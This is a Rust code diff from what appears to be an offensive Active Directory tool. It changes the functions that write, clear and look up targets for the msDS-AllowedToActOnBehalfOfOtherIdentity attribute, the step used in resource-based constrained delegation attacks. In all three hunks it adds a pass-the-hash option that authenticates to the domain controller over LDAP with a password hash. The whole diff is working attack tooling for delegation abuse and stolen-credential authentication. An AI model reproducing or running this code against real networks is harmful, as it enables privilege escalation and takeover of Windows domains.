@@ -175,14 +175,25 @@ async fn write_rbcd_attribute(config: &HuntConfig, target_dn: &str, sd_bytes: &[
         target_dn
     );
 
-    let mut conn = ldap::LdapSession::connect(
-        &config.dc_ip,
-        &config.domain,
-        &config.username,
-        &config.secret,
-        config.use_ldaps,
-    )
-    .await?;
+    let mut conn = if config.use_hash {
+        ldap::LdapSession::connect_with_hash(
+            &config.dc_ip,
+            &config.domain,
+            &config.username,
+            &config.secret,
+            config.use_ldaps,
+        )
+        .await?
+    } else {
+        ldap::LdapSession::connect(
+            &config.dc_ip,
+            &config.domain,
+            &config.username,
+            &config.secret,
+            config.use_ldaps,
+        )
+        .await?
+    };
 
     conn.modify_replace(
         target_dn,
@@ -203,14 +214,25 @@ async fn write_rbcd_attribute(config: &HuntConfig, target_dn: &str, sd_bytes: &[
 async fn clear_rbcd_attribute(config: &HuntConfig, target_dn: &str) -> Result<()> {
     info!("LDAP: Clearing RBCD attribute on {}", target_dn);
 
-    let mut conn = ldap::LdapSession::connect(
-        &config.dc_ip,
-        &config.domain,
-        &config.username,
-        &config.secret,
-        config.use_ldaps,
-    )
-    .await?;
+    let mut conn = if config.use_hash {
+        ldap::LdapSession::connect_with_hash(
+            &config.dc_ip,
+            &config.domain,
+            &config.username,
+            &config.secret,
+            config.use_ldaps,
+        )
+        .await?
+    } else {
+        ldap::LdapSession::connect(
+            &config.dc_ip,
+            &config.domain,
+            &config.username,
+            &config.secret,
+            config.use_ldaps,
+        )
+        .await?
+    };
 
     conn.modify_delete(target_dn, "msDS-AllowedToActOnBehalfOfOtherIdentity")
         .await?;
@@ -224,14 +246,25 @@ async fn clear_rbcd_attribute(config: &HuntConfig, target_dn: &str) -> Result<()
 async fn resolve_computer_dn(config: &HuntConfig, computer_name: &str) -> Result<String> {
     let clean_name = computer_name.trim_end_matches('$');
 
-    let mut conn = ldap::LdapSession::connect(
-        &config.dc_ip,
-        &config.domain,
-        &config.username,
-        &config.secret,
-        config.use_ldaps,
-    )
-    .await?;
+    let mut conn = if config.use_hash {
+        ldap::LdapSession::connect_with_hash(
+            &config.dc_ip,
+            &config.domain,
+            &config.username,
+            &config.secret,
+            config.use_ldaps,
+        )
+        .await?
+    } else {
+        ldap::LdapSession::connect(
+            &config.dc_ip,
+            &config.domain,
+            &config.username,
+            &config.secret,
+            config.use_ldaps,
+        )
+        .await?
+    };
 
     let computers = conn.enumerate_computers().await?;
     conn.disconnect().await?;
